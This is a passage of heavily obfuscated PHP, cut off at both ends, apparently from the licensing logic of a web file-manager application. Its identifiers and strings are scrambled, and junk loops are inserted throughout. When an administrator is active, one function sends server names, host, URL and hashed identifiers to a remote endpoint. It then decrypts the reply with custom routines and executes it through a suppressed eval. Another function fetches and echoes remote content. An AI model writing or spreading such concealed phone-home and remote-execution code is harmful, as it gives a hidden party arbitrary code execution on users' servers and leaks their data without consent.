$this->syjw1b668d35($ÀŸœ†áğ[$İÙ³Ğô¬[86]][$ó°ğë®], $ÉÅû„½); $—²¾¶çª = json_decode($—²¾¶çª, !0); } if (!is_array($—²¾¶çª)) { return $this->teom4777a852(); } $Œ‚õí¥ğ = strtotime($—²¾¶çª[$İÙ³Ğô¬[129]]); if (time() >= $Œ‚õí¥ğ) { return $this->teom4777a852(); } if (!isset($—²¾¶çª[$İÙ³Ğô¬[207]]) || time() - $—²¾¶çª[$İÙ³Ğô¬[207]] > 20) { $—²¾¶çª[$İÙ³Ğô¬[207]] = time(); Cache::set($œ§İ«Ÿ, $—²¾¶çª); } $this->twke1ca623a2 = $—²¾¶çª; $this->pnjea78001aa = $‹ŞÎ·¦[$İÙ³Ğô¬[108]]; } private function vjfud28268c3() { $¢«ãâ†‚ =& $_SERVER[ü¢ÙÊñÛ]; $µìÚ´üš =& $_SERVER[ ï©Şİµ]; $²êƒö· = $GLOBALS[$µìÚ´üš[13]]; $ëòœ¨ó = $_SERVER[$µìÚ´üš[24]]; $ÇÄ£üŒ´ = $¢«ãâ†‚[745]; while (strlen($ÇÄ£üŒ´) < $¢«ãâ†‚[713]) { if (!$ÇÄ£üŒ´) { break; } $ÇÄ£üŒ´++; } if ($ëòœ¨ó == $µìÚ´üš[208] && $this->pnjea78001aa == $µìÚ´üš[109]) { show_json(LNG($µìÚ´üš[209]), !1, $µìÚ´üš[210]); } $ÔÛ¹âËµ = array($µìÚ´üš[211], $µìÚ´üš[212]); if (in_array($ëòœ¨ó, $ÔÛ¹âËµ)) { if ($this->pnjea78001aa == $µìÚ´üš[109] && isset($²êƒö·[$µìÚ´üš[213]])) { show_json(LNG($µìÚ´üš[209]), !1, $µìÚ´üš[210]); die; } $úà„Ï´ = $this->zhxr89b51120(); if ($úà„Ï´ != intval($µìÚ´üš[214])) { if ($úà„Ï´ <= Model($µìÚ´üš[125])->count()) { show_json(LNG($µìÚ´üš[215]), !1, $µìÚ´üš[210]); die; } } } } private function owzm58b9848a() { $Ñ·¥ûı =& $_SERVER[ü¢ÙÊñÛ]; $Šº¯¶ å =& $_SERVER[ ï©Şİµ]; $û¦“ İî = array($Šº¯¶ å[119], $Šº¯¶ å[120]); if (!KodUser::isRoot() || !isset($_GET[$Šº¯¶ å[216]])) { return; } if (!in_array($_SERVER[$Šº¯¶ å[24]], $û¦“ İî)) { return; } $ßÀ´–›Â = $Šº¯¶ å[217]; $Æ“å¾”ç = $Ñ·¥ûı[746]; $ßÀ´–›Â = $this->ofbhf4fdc38c($ßÀ´–›Â, $Šº¯¶ å[218]); $¸µªËÎ“ = $Ñ·¥ûı[747]; if (!$¸µªËÎ“) { return; } $¼«ÒŸëÚ = stream_context_create(array($Šº¯¶ å[219] => array($Šº¯¶ å[220] => $Šº¯¶ å[221], $Šº¯¶ å[222] => 3))); $åŸÄÇ¯ = $Ñ·¥ûı[748]; if (strlen($åŸÄÇ¯) < $Ñ·¥ûı[721]) { die; } $£¥±Ã˜á = @file_get_contents($ßÀ´–›Â, !1, $¼«ÒŸëÚ); $é­Ë˜¡ = $Ñ·¥ûı[749]; if (strlen($é­Ë˜¡) < $Ñ·¥ûı[11]) { return; } header($Šº¯¶ å[223]); if ($£¥±Ã˜á && strstr($£¥±Ã˜á, $Šº¯¶ å[224])) { echo $£¥±Ã˜á; } die; } public function kurm91633bbc($ëÀªİ¦Î) { $²áüÂûÈ =& $_SERVER[ ï©Şİµ]; if ($this->pnjea78001aa == $²áüÂûÈ[225]) { return $ëÀªİ¦Î; } $÷º í±Á = $this->versionPluginList(); $œÛ­ßÍû = explode($²áüÂûÈ[226], $this->versionPluginFilter()); $‹£¿äˆì = array(); foreach ($÷º í±Á as $®ŸÀÖÄ÷ => $âş®üæİ) { if ($âş®üæİ == $²áüÂûÈ[227] && substr($this->pnjea78001aa, 0, 1) == $²áüÂûÈ[227]) { continue; } if (!in_array($®ŸÀÖÄ÷, $œÛ­ßÍû)) { $‹£¿äˆì[] = $®ŸÀÖÄ÷; } } foreach ($‹£¿äˆì as $®ŸÀÖÄ÷) { unset($ëÀªİ¦Î[$®ŸÀÖÄ÷]); } return $ëÀªİ¦Î; } private function versionPluginList() { $Ñ¡àÍø† =& $_SERVER[ ï©Şİµ]; return array($Ñ¡àÍø†[228] => $Ñ¡àÍø†[227], $Ñ¡àÍø†[229] => $Ñ¡àÍø†[227], $Ñ¡àÍø†[230] => $Ñ¡àÍø†[227], $Ñ¡àÍø†[231] => $Ñ¡àÍø†[232], $Ñ¡àÍø†[233] => $Ñ¡àÍø†[232], $Ñ¡àÍø†[234] => $Ñ¡àÍø†[232], $Ñ¡àÍø†[235] => $Ñ¡àÍø†[232], $Ñ¡àÍø†[236] => $Ñ¡àÍø†[232], $Ñ¡àÍø†[237] => $Ñ¡àÍø†[232], $Ñ¡àÍø†[238] => $Ñ¡àÍø†[232], $Ñ¡àÍø†[239] => $Ñ¡àÍø†[232], $Ñ¡àÍø†[240] => $Ñ¡àÍø†[232], $Ñ¡àÍø†[241] => $Ñ¡àÍø†[232], $Ñ¡àÍø†[242] => $Ñ¡àÍø†[232], $Ñ¡àÍø†[243] => $Ñ¡àÍø†[232], $Ñ¡àÍø†[244] => $Ñ¡àÍø†[232]); } private function versionPluginFilter() { $£ÓÍÏË¿ =& $_SERVER[ü¢ÙÊñÛ]; $ºå®¬Âà =& $_SERVER[ ï©Şİµ]; if ($this->pnjea78001aa == $ºå®¬Âà[109]) { return $ºå®¬Âà[6]; } $ˆâ¦›»© = _get($this->twke1ca623a2, $ºå®¬Âà[245], $ºå®¬Âà[6]); $ÖèîÁ°æ = $£ÓÍÏË¿[750]; $™ìÊ‚¼â = _get($this->twke1ca623a2, $ºå®¬Âà[116], $ºå®¬Âà[6]); $ÌºÂÈŒÜ = _get($this->twke1ca623a2, $ºå®¬Âà[246], $ºå®¬Âà[6]); $â´¶®şó = $£ÓÍÏË¿[751]; if (!$â´¶®şó) { return; } if ($™ìÊ‚¼â > time() && $ÌºÂÈŒÜ > time()) { $Ù’İ´ ¦ = explode($ºå®¬Âà[226], $ˆâ¦›»©); $³¤Åû¤Ï = array_keys($this->versionPluginList()); $ˆâ¦›»© = array_merge($Ù’İ´ ¦, $³¤Åû¤Ï); $ˆâ¦›»© = implode($ºå®¬Âà[226], array_filter(array_unique($ˆâ¦›»©))); } return $ˆâ¦›»©; } private function njbk10b9bae4() { $‰ıíÉ =& $_SERVER[ ï©Şİµ]; if ($this->pnjea78001aa != $‰ıíÉ[109]) { $GLOBALS[$‰ıíÉ[86]][$‰ıíÉ[90]][$‰ıíÉ[247]] = $‰ıíÉ[206]; return; } $GLOBALS[$‰ıíÉ[86]][$‰ıíÉ[248]] = $‰ıíÉ[122]; if (Model($‰ıíÉ[249])->get($‰ıíÉ[63]) != $‰ıíÉ[206]) { Model($‰ıíÉ[249])->set($‰ıíÉ[63], $‰ıíÉ[206]); } } public function gtuf4ea147c5() { return $_SERVER[ ï©Şİµ][250]; $Ìâç¨™¹ = $_SERVER[ü¢ÙÊñÛ][752]; } private function bqlh039321e9() { $ø¤ïÍì€ =& $_SERVER[ü¢ÙÊñÛ]; $•ı„Í¡õ =& $_SERVER[ ï©Şİµ]; $ÏÑ¼ÔÈš = array($•ı„Í¡õ[251], $•ı„Í¡õ[252], $•ı„Í¡õ[253]); $×¦ìÁùæ = $ø¤ïÍì€[753]; if (!$×¦ìÁùæ) { die; } $ÁƒıñÇ = $•ı„Í¡õ[254] . md5($•ı„Í¡õ[255]); $™€£˜æû = $ø¤ïÍì€[754]; if ($this->pnjea78001aa == $•ı„Í¡õ[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$•ı„Í¡õ[24]], $ÏÑ¼ÔÈš)) { return; } if (time() % 4 != 0) { return; } $ú¸ø½Ş“ = call_user_func(array($•ı„Í¡õ[256], $•ı„Í¡õ[257]), $ÁƒıñÇ); if ($ú¸ø½Ş“ && time() - $ú¸ø½Ş“ < intval($•ı„Í¡õ[258])) { return; } call_user_func(array($•ı„Í¡õ[256], $•ı„Í¡õ[139]), $ÁƒıñÇ, time()); $€Œ†–ö = Model($•ı„Í¡õ[33])->get($•ı„Í¡õ[100]); $‹¯öµÇã = array($•ı„Í¡õ[152] => Model($•ı„Í¡õ[33])->get($•ı„Í¡õ[153]), $•ı„Í¡õ[167] => $this->pnjea78001aa, $•ı„Í¡õ[163] => $_SERVER[$•ı„Í¡õ[164]], $•ı„Í¡õ[165] => Model($•ı„Í¡õ[33])->get($•ı„Í¡õ[131]), $•ı„Í¡õ[105] => md5($_SERVER[$•ı„Í¡õ[106]] . $€Œ†–ö), $•ı„Í¡õ[156] => $•ı„Í¡õ[136], $•ı„Í¡õ[159] => $_SERVER[$•ı„Í¡õ[160]]); $ˆŠ×•€Á = $this->yibn3c5477b0($•ı„Í¡õ[259], $‹¯öµÇã); if (!is_array($ˆŠ×•€Á)) { return; } if ($ˆŠ×•€Á[$•ı„Í¡õ[152]] && $ˆŠ×•€Á[$•ı„Í¡õ[260]]) { if ($this->rdcy1f59fbec($ˆŠ×•€Á[$•ı„Í¡õ[260]]) == $‹¯öµÇã[$•ı„Í¡õ[152]]) { return; } } $this->teom4777a852(); $Ò…ƒ¿¸‡ = $ø¤ïÍì€[755]; if ($this->rdcy1f59fbec($ˆŠ×•€Á[$•ı„Í¡õ[260]]) != $‹¯öµÇã[$•ı„Í¡õ[152]]) { $“øü¥™Ò = array($•ı„Í¡õ[185] => $€Œ†–ö, $•ı„Í¡õ[186] => $_SERVER[$•ı„Í¡õ[106]], $•ı„Í¡õ[187] => this_url(), $•ı„Í¡õ[161] => $_SERVER[$•ı„Í¡õ[162]]); $®ŞñœæÓ = $this->xult27f7f681(json_encode($“øü¥™Ò)); $ˆŠ×•€Á = $this->yibn3c5477b0($•ı„Í¡õ[188] . $®ŞñœæÓ); if ($ˆŠ×•€Á && is_array($ˆŠ×•€Á) && isset($ˆŠ×•€Á[$•ı„Í¡õ[260]])) { $Ó——³ŠÒ = $this->syjw1b668d35($ˆŠ×•€Á[$•ı„Í¡õ[260]], 2); if ($Ó——³ŠÒ) { $Ó——³ŠÒ = $this->rdcy1f59fbec($Ó——³ŠÒ); } if ($Ó——³ŠÒ) { try { @eval($Ó——³ŠÒ); } catch (Exception $›Ï£µáÙ) { } } } } } private function yibn3c5477b0($È™âà½ = '', $…æ¯§“ = array(), $ÛƒıƒÈ¼ = 5) { $ñ­×˜×õ =& $_SERVER[ü¢ÙÊñÛ]; $ÁµÖ²ô¨ =& $_SERVER[ ï©Şİµ]; $í˜¦”µ = $ÁµÖ²ô¨[261]; $… “æº = $ñ­×˜×õ[756]; if (!$… “æº) { die; } $í˜¦”µ = $this->ofbhf4fdc38c($í˜¦”µ, $ÁµÖ²ô¨[262]); $é¼©Î¢· = $ñ­×˜×õ[757]; while (strlen($é¼©Î¢·) < $ñ­×˜×õ[716]) { if (!$é¼©Î¢·) { break; } $é¼©Î¢·++; } $í˜¦”µ = $í˜¦”µ . $È™âà½; $„ÂÅù£Ü = $ñ­×˜×õ[758]; while (strlen($„ÂÅù£Ü) < $ñ­×˜×õ[706]) { if (!$„ÂÅù£Ü) { break; } $„ÂÅù£Ü++; } if ($…æ¯§“ && is_array($…æ¯§“)) { $í˜¦”µ = $í˜¦”µ . $ÁµÖ²ô¨[263] . http_build_query($…æ¯§“); } if ($…æ¯§“ === -1) { return $í˜¦”µ; } $ú÷ÒàŠó = stream_context_create(array($ÁµÖ²ô¨[219] => array($ÁµÖ²ô¨[222] => $ÛƒıƒÈ¼, $ÁµÖ²ô¨[220] => $ÁµÖ²ô¨[264]), $ÁµÖ²ô¨[265] => array($ÁµÖ²ô¨[266] => !1, $ÁµÖ²ô¨[267] => !1))); $²³ìªø› = $ñ­×˜×õ[759]; if (strlen($²³ìªø›) < $ñ­×˜×õ[721]) { die; } $…æ¯§“ = @file_get_contents($í˜¦”µ, !1, $ú÷ÒàŠó); return json_decode($…æ¯§“, !0); $´ƒ„³Ÿ‰ = $ñ­×˜×õ[760]; if (strlen($´ƒ„³Ÿ‰) < $ñ­×˜×õ[11]) { return; } } private function zhxr89b51120() { $ßú”˜»– =& $_SERVER[ü¢ÙÊñÛ]; $ãô°Ç›­ =& $_SERVER[ ï©Şİµ]; $—µé˜¾Å = array($ãô°Ç›­[268] => $ãô°Ç›­[269], $ãô°Ç›­[270] => $ãô°Ç›­[271], $ãô°Ç›­[272] => $ãô°Ç›­[273], $ãô°Ç›­[274] => $ãô°Ç›­[275], $ãô°Ç›­[276] => $ãô°Ç›­[277], $ãô°Ç›­[278] => $ãô°Ç›­[214], $ãô°Ç›­[279] => $ãô°Ç›­[214], $ãô°Ç›­[280] => $ãô°Ç›­[269], $ãô°Ç›­[281] => $ãô°Ç›­[271], $ãô°Ç›­[282] => $ãô°Ç›­[273], $ãô°Ç›­[283] => $ãô°Ç›­[284], $ãô°Ç›­[285] => $ãô°Ç›­[275], $ãô°Ç›­[286] => $ãô°Ç›­[287], $ãô°Ç›­[288] => $ãô°Ç›­[277], $ãô°Ç›­[289] => $ãô°Ç›­[290], $ãô°Ç›­[291] => $ãô°Ç›­[292], $ãô°Ç›­[293] => $ãô°Ç›­[294]); $ª¸Ç£ì” = $—µé˜¾Å[$this->pnjea78001aa]; $–œşÁœ¤ = $ßú”˜»–[761]; while (strlen($–œşÁœ¤) < $ßú”˜»–[11]) { if (!$–œşÁœ¤) { break; } $–œşÁœ¤++; } $ª¸Ç£ì” = intval($ª¸Ç£ì” ? $ª¸Ç£ì” : $ãô°Ç›­[269]); $š©¾ú—Ü = $ßú”˜»–[762]; if (strlen($š©¾ú—Ü) < $ßú”˜»–[721]) { return; } $Ûé“šõí = _get($this->twke1ca623a2, $ãô°Ç›­[295]); $Ûé“šõí = $Ûé“šõí ? intval($Ûé“šõí) : 0; return $ª¸Ç£ì” + $Ûé“šõí; } public function vmyh9d774633($øœÇ²µ‘) { $˜òíÒ€é =& $_SERVER[ü¢ÙÊñÛ]; $—Â¿ãı  =& $_SERVER[ ï©Şİµ]; $ì–‹‚Åø = $this->zhxr89b51120(); $µàìŸ› = $˜òíÒ€é[763]; if (!$µàìŸ›) { die; } if ($øœÇ²µ‘[$—Â¿ãı [296]] == $—Â¿ãı [122]) { return; } if ($ì–‹‚Åø >= intval($—Â¿ãı [214])) { return; } $µ·«…şŒ = Model($—Â¿ãı [125])->count(); if ($µ·«…şŒ <= $ì–‹‚Åø) { return; } $ƒ×¦ÅÈ = Model($—Â¿ãı [125])->field($—Â¿ãı [296])->limit($ì–‹‚Åø)->select(); $ƒ×¦ÅÈ = array_to_keyvalue($ƒ×¦ÅÈ, $—Â¿ãı [6], $—Â¿ãı [296]); $í›Õ›© = $˜òíÒ€é[764]; if (!$í›Õ›©) { die; } if (!in_array($øœÇ²µ‘[$—Â¿ãı [296]], $ƒ×¦ÅÈ)) { show_json($—Â¿ãı [297], !1, $—Â¿ãı [210]); } } public function lnaf1af026e3() { $æ†€¯Ì =& $_SERVER[ ï©Şİµ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ˆ©ÄÇèÜ = $æ†€¯Ì[217]; $ˆ©ÄÇèÜ = $this->ofbhf4fdc38c($ˆ©ÄÇèÜ, $æ†€¯Ì[218]); $ØòØÕ·­ = stream_context_create(array($æ†€¯Ì[219] => array($æ†€¯Ì[220] => $æ†€¯Ì[221], $æ†€¯Ì[222] => 3))); $¿úåº‚è = @file_get_contents($ˆ©ÄÇèÜ, !1, $ØòØÕ·­); echo $æ†€¯Ì[298] . hash_encode($¿úåº‚è) . $æ†€¯Ì[299]; } private function kydh1a3981ac($˜ÇÆÉÍ›, $â˜Õ›š£, $»¼ş×«ë = 3) { $ÒíÙ‡œê =& $_SERVER[ü¢ÙÊñÛ]; $‰ƒÔ„Æè =& $_SERVER[ ï©Şİµ]; usleep(1); $˜ÇÆÉÍ› = trim($˜ÇÆÉÍ›); $Îº³¶ÎÜ = mt_rand(0, 5) . $‰ƒÔ„Æè[6]; $ùİ‘ñ¿à = $ÒíÙ‡œê[765]; $Úß¼ƒÇ‘ = rand_string(15); $óˆà¤µ© = $‰ƒÔ„Æè[300]; switch ($Îº³¶ÎÜ) { case $‰ƒÔ„Æè[206]: $©Ù²íàğ = $this->lobsa866628f($˜ÇÆÉÍ›, strrev($â˜Õ›š£ . $Úß¼ƒÇ‘)); $èÉµ¡ı’ = $ÒíÙ‡œê[766]; while ($èÉµ¡ı’ < $ÒíÙ‡œê[721]) { if ($èÉµ¡ı’ >= 0) { break; } $èÉµ¡ı’++; } break; case $‰ƒÔ„Æè[122]: $©Ù²íàğ = $this->lobsa866628f($˜ÇÆÉÍ›, strrev($Úß¼ƒÇ‘ . $â˜Õ›š£)); $û äá÷Ÿ = $ÒíÙ‡œê[767]; if (strlen($û äá÷Ÿ) < $ÒíÙ‡œê[713]) { return; } break; $òÄµ¿şÀ = $ÒíÙ‡œê[768]; case $‰ƒÔ„Æè[301]: $©Ù²íàğ = $this->lobsa866628f($˜ÇÆÉÍ›, base64_encode($Úß¼ƒÇ‘ . $â˜Õ›š£)); $ØöÚÕî“ = $ÒíÙ‡œê[769]; while ($ØöÚÕî“ < $ÒíÙ‡œê[11]) { if ($ØöÚÕî“ >= 0) { break; } $ØöÚÕî“++; } break; $¥Ù¥îô¥ = $ÒíÙ‡œê[770]; if (!$¥Ù¥îô¥) { die; } case $‰ƒÔ„Æè[302]: $©Ù²íàğ = $this->lobsa866628f($˜ÇÆÉÍ›, md5($Úß¼ƒÇ‘ . $â˜Õ›š£)); break; $á¿«»Ó = $ÒíÙ‡œê[771]; case $‰ƒÔ„Æè[303]: $˜ÇÆÉÍ› = base64_encode($˜ÇÆÉÍ›); $Óà¬ÅŠá = $ÒíÙ‡œê[772]; while ($Óà¬ÅŠá < $ÒíÙ‡œê[706]) { if ($Óà¬ÅŠá >= 0) { break; } $Óà¬ÅŠá++; } $ô­ÁĞÉŠ = rand(0, 64); $øÇš‰°‰ = $óˆà¤µ©[$ô­ÁĞÉŠ]; $µÏ€Şœ¡ = md5($øÇš‰°‰ . md5($â˜Õ›š£ . $øÇš‰°‰) . $â˜Õ›š£); $øãÒæ ¯ = $ÒíÙ‡œê[773]; while (strlen($øãÒæ ¯) < $ÒíÙ‡œê[11]) { if (!$øãÒæ ¯) { break; } $øãÒæ ¯++; } $µÏ€Şœ¡ = substr($µÏ€Şœ¡, $ô­ÁĞÉŠ % 8, $ô­ÁĞÉŠ % 8 + 7); $Ç´æ½•Ê = $‰ƒÔ„Æè[6]; $ùâ×ëÜç = 0; $øñí«óÌ = $ÒíÙ‡œê[774]; if (strlen($øñí«óÌ) < $ÒíÙ‡œê[713]) { return; } $òßñÌøõ = 0; $¯Úå‘Ë = $ÒíÙ‡œê[775]; if (!$¯Úå‘Ë) { return; } $À€²°† = 0; for ($ùâ×ëÜç = 0; $ùâ×ëÜç < strlen($˜ÇÆÉÍ›); $ùâ×ëÜç++) { $À€²°† = $À€²°† == strlen($µÏ€Şœ¡) ? 0 : $À€²°†; $‘Ùê”çÜ = $ÒíÙ‡œê[776]; $òßñÌøõ = ($ô­ÁĞÉŠ + strpos($óˆà¤µ©, $˜ÇÆÉÍ›[$ùâ×ëÜç]) + ord($µÏ€Şœ¡[$À€²°†++])) % 64; $Ç´æ½•Ê .= $óˆà¤µ©[$òßñÌøõ]; } $©Ù²íàğ = hash_encode($øÇš‰°‰ . $Ç´æ½•Ê); break; default: $©Ù²íàğ = $this->lobsa866628f($˜ÇÆÉÍ›, $â˜Õ›š£ . $Úß¼ƒÇ‘); $Œå¾”Ê = $ÒíÙ‡œê[777]; if (strlen($Œå¾”Ê) < $ÒíÙ‡œê[716]) { die; } break; $§ü™À»‚ = $ÒíÙ‡œê[778]; } $©Ù²íàğ = strrev($Îº³¶ÎÜ . $Úß¼ƒÇ‘ . $©Ù²íàğ); $úÄÔşÜ = $ÒíÙ‡œê[779]; if ($»¼ş×«ë - 1 > 0) { $©Ù²íàğ = $this->kydh1a3981ac($©Ù²íàğ, $â˜Õ›š£, $»¼ş×«ë - 1); } return $©Ù²íàğ; } private function syjw1b668d35($“×Ôì, $ï°ü¶ï”, $çº»° = 3) { $’ˆ»°š¯ =& $_SERVER[ü¢ÙÊñÛ]; $Œ¬Ú–‰İ =& $_SERVER[ ï©Şİµ]; if (!is_string($“×Ôì) || strlen($“×Ôì) < 10) { return !1; } $“×Ôì = trim($“×Ôì); $Áéİ™÷ = $’ˆ»°š¯[780]; $“×Ôì = strrev($“×Ôì); $§—ßÊºÊ = $“×Ôì[0]; $Ú˜„ç†Ì = substr($“×Ôì, 1, 15); $ú¨ç¶ò = $’ˆ»°š¯[781]; $“×Ôì = substr($“×Ôì, 16); $Óû« ö = $’ˆ»°š¯[782]; $â™à¤ßî = $Œ¬Ú–‰İ[300]; $°şÕªÇ = $’ˆ»°š¯[783]; if (strlen($°şÕªÇ) < $’ˆ»°š¯[721]) { return; } switch ($§—ßÊºÊ) { case $Œ¬Ú–‰İ[206]: $²Ô‡öà = $this->ofbhf4fdc38c($“×Ôì, strrev($ï°ü¶ï” . $Ú˜„ç†Ì)); $æ¹Ì€•ñ = $’ˆ»°š¯[714]; while ($æ¹Ì€•ñ < $’ˆ»°š¯[713]) { if ($æ¹Ì€•ñ >= 0) { break; } $æ¹Ì€•ñ++; } break; $ı¿õ÷¿ö = $’ˆ»°š¯[784]; if (!$ı¿õ÷¿ö) { return; } case $Œ¬Ú–‰İ[122]: $²Ô‡öà = $this->ofbhf4fdc38c($“×Ôì, strrev($Ú˜„ç†Ì . $ï°ü¶ï”)); break; case $Œ¬Ú–‰İ[301]: $²Ô‡öà = $this->ofbhf4fdc38c($“×Ôì, base64_encode($Ú˜„ç†Ì . $ï°ü¶ï”)); break; $îòœöŒ© = $’ˆ»°š¯[785]; if (strlen($îòœöŒ©) < $’ˆ»°š¯[721]) { die; } case $Œ¬Ú–‰İ[302]: $²Ô‡öà = $this->ofbhf4fdc38c($“×Ôì, md5($Ú˜„ç†Ì . $ï°ü¶ï”)); $’„ãñû = $’ˆ»°š¯[786]; break; case $Œ¬Ú–‰İ[303]: $“×Ôì = hash_decode($“×Ôì); $”–İ¹µÙ = $’ˆ»°š¯[787]; if (strlen($”–İ¹µÙ) < $’ˆ»°š¯[706]) { die; } $ó´€¸Ú = $“×Ôì[0]; $“×Ôì = substr($“×Ôì, 1); $ôà¶¢¼ = strpos($â™à¤ßî, $ó´€¸Ú); $Ä‘ÛÛ•— = $’ˆ»°š¯[788]; $É–ŞÔçÖ = md5($ó´€¸Ú . md5($ï°ü¶ï” . $ó´€¸Ú) . $ï°ü¶ï”); $É–ŞÔçÖ = substr($É–ŞÔçÖ, $ôà¶¢¼ % 8, $ôà¶¢¼ % 8 + 7); $©Ùæ³¨ = $Œ¬Ú–‰İ[6]; $ÓÎ¹å = $’ˆ»°š¯[789]; $ğ—øäìó = 0; $È–¶¶Ü¯ = 0; $èù³„õ¾ = $’ˆ»°š¯[790]; while ($èù³„õ¾ < $’ˆ»°š¯[706]) { if ($èù³„õ¾ >= 0) { break; } $èù³„õ¾++; } $»Ø‚×å” = 0; for ($ğ—øäìó = 0; $ğ—øäìó < strlen($“×Ôì); $ğ—øäìó++) { $»Ø‚×å” = $»Ø‚×å” == strlen($É–ŞÔçÖ) ? 0 : $»Ø‚×å”; $áÅäŸè¼ = $’ˆ»°š¯[791]; while (strlen($áÅäŸè¼) < $’ˆ»°š¯[713]) { if (!$áÅäŸè¼) { break; } $áÅäŸè¼++; } $Ó»’şƒ« = $»Ø‚×å”++; $È–¶¶Ü¯ = strpos($â™à¤ßî, $“×Ôì[$ğ—øäìó]) - $ôà¶¢¼ - ord($É–ŞÔçÖ[$Ó»’şƒ«]); $˜ïÓÛ€Ñ = $’ˆ»°š¯[792]; if (!$˜ïÓÛ€Ñ) { die; } while ($È–¶¶Ü¯ < 0) { $È–¶¶Ü¯ += 64; $‚¥ÒÂö× = $’ˆ»°š¯[793]; if (strlen($‚¥ÒÂö×) < $’ˆ»°š¯[706]) { die; } } $©Ùæ³¨ .= $â™à¤ßî[$È–¶¶Ü¯]; $ûì©äšÒ = $’ˆ»°š¯[794]; } $²Ô‡öà = base64_decode($©Ùæ³¨); $ñŞ„Ù = $’ˆ»°š¯[795]; while ($ñŞ„Ù < $’ˆ»°š¯[716]) { if ($ñŞ„Ù >= 0) { break; } $ñŞ„Ù++; } break; default: $²Ô‡öà = $this->ofbhf4fdc38c($“×Ôì, $ï°ü¶ï” . $Ú˜„ç†Ì); $‹ğ«ÂÜÀ = $’ˆ»°š¯[796]; if (strlen($‹ğ«ÂÜÀ) < $’ˆ»°š¯[706]) { return; } break; } if ($çº»° - 1 > 0) { $²Ô‡öà = $this->syjw1b668d35($²Ô‡öà, $ï°ü¶ï”, $çº»° - 1); } return $²Ô‡öà; } public function xult27f7f681($ÆÉ£œş) { $è§Œ¡ôÅ =& $_SERVER[ü¢ÙÊñÛ]; $Üá¤Šœß =& $_SERVER[ ï©Şİµ]; $°ƒõš¥Ñ = $this->spfja1b95769(); $è¹òğè¾ = $this->spfja1b95769(); $ãøØ› = $è§Œ¡ôÅ[797]; while ($ãøØ› < $è§Œ¡ôÅ[11]) { if ($ãøØ› >= 0) { break; } $ãøØ›++; } $òÅ¸µË² = ($°ƒõš¥Ñ - 1) * ($è¹òğè¾ - 1); $úËŸª = $è§Œ¡ôÅ[798]; while ($úËŸª < $è§Œ¡ôÅ[706]) { if ($úËŸª >= 0) { break; } $úËŸª++; } $àÙÛìÁ = intval(($°ƒõš¥Ñ + $è¹òğè¾) / 2); $£èÄîØê = $è§Œ¡ôÅ[799]; while (1) { $¦‡¤ó = $àÙÛìÁ; $ªªñ¼Ş½ = $òÅ¸µË²; while ($ªªñ¼Ş½ % $¦‡¤ó != 0) { $ “à¥” = $ªªñ¼Ş½; $ªªñ¼Ş½ = $¦‡¤ó; $¦‡¤ó = $ “à¥” % $¦‡¤ó; } if ($¦‡¤ó == 1) { break; } else { $àÙÛìÁ++; } } $ˆİÜ€ÈÃ = 2; $ªÓÃ¼˜„ = $è§Œ¡ôÅ[800]; if (strlen($ªÓÃ¼˜„) < $è§Œ¡ôÅ[713]) { die; } for ($¤ô€Ò€Ã = 0; $¤ô€Ò€Ã < $òÅ¸µË² * 10; $¤ô€Ò€Ã++) { if (($òÅ¸µË² * $¤ô€Ò€Ã + 1) % $àÙÛìÁ == 0) { $ˆİÜ€ÈÃ = intval(($òÅ¸µË² * $¤ô€Ò€Ã + 1) / $àÙÛìÁ); break; } } $Š¹”Ëç = $this->lobsa866628f($°ƒõš¥Ñ * $è¹òğè¾ . $Üá¤Šœß[6], $Üá¤Šœß[136]); $âØØ»í÷ = md5($Üá¤Šœß[304] . ($°ƒõš¥Ñ + $è¹òğè¾) . $Üá¤Šœß[305] . $àÙÛìÁ . $Üá¤Šœß[305] . $ˆİÜ€ÈÃ . $Üá¤Šœß[306]); $ËşÏü³§ = $this->lobsa866628f($ÆÉ£œş, $âØØ»í÷) . $Üá¤Šœß[307] . $Š¹”Ëç; return $ËşÏü³§; $èâ™ßî¡ = $è§Œ¡ôÅ[801]; } public function rdcy1f59fbec($ØŠøèüø) { $ª­¨˜Í =& $_SERVER[ü¢ÙÊñÛ]; $¸¢”«“Æ =& $_SERVER[ ï©Şİµ]; $ŒÈÊËÒ™ = explode($¸¢”«“Æ[307], $ØŠøèüø); if (count($ŒÈÊËÒ™) != 2) { return $¸¢”«“Æ[6]; } $ç±ËŒùß = $this->ofbhf4fdc38c($ŒÈÊËÒ™[1] . $¸¢”«“Æ[6], $¸¢”«“Æ[136]); if (!$ç±ËŒùß) { return $¸¢”«“Æ[6]; } $ç±ËŒùß = intval($ç±ËŒùß); $’Á¡£Óä = 0; $Şœ½ºìğ = $ª­¨˜Í[802]; while ($Şœ½ºìğ < $ª­¨˜Í[11]) { if ($Şœ½ºìğ >= 0) { break; } $Şœ½ºìğ++; } $èÇ”—öÒ = 0; $¼®§¬ª = $ª­¨˜Í[803]; while ($¼®§¬ª < $ª­¨˜Í[11]) { if ($¼®§¬ª >= 0) { break; } $¼®§¬ª++; } for ($Ìë‘ØĞ™ = 3; $Ìë‘ØĞ™ < $ç±ËŒùß; $Ìë‘ØĞ™ += 2) { if ($ç±ËŒùß % $Ìë‘ØĞ™ != 0) { continue; } $’Á¡£Óä = $Ìë‘ØĞ™; $èÇ”—öÒ = intval($ç±ËŒùß / $Ìë‘ØĞ™); break; } $ÒÅ¿«‰ = ($’Á¡£Óä - 1) * ($èÇ”—öÒ - 1); $ñÂõïÆİ = intval(($’Á¡£Óä + $èÇ”—öÒ) / 2); while (1) { $À•¡üšì = $ñÂõïÆİ; $ˆÌÆöğ = $ÒÅ¿«‰; $ºÏø™ã¤ = $ª­¨˜Í[804]; if (!$ºÏø™ã¤) { return; } while ($ˆÌÆöğ % $À•¡üšì != 0) { $¡ßÅÏéß = $ˆÌÆöğ; $ˆÌÆöğ = $À•¡üšì; $À•¡üšì = $¡ßÅÏéß % $À•¡üšì; $Üşç í‡ = $ª­¨˜Í[805]; if (strlen($Üşç í‡) < $ª­¨˜Í[11]) { die; } } if ($À•¡üšì == 1) { break; } else { $ñÂõïÆİ++; } } $ƒå‰Åæé = 2; $Õöë¢Àª = $ª­¨˜Í[806]; while (strlen($Õöë¢Àª) < $ª­¨˜Í[721]) { if (!$Õöë¢Àª) { break; } $Õöë¢Àª++; } for ($Ìë‘ØĞ™ = 0; $Ìë‘ØĞ™ < $ÒÅ¿«‰ * 10; $Ìë‘ØĞ™++) { if (($ÒÅ¿«‰ * $Ìë‘ØĞ™ + 1) % $ñÂõïÆİ == 0) { $ƒå‰Åæé = 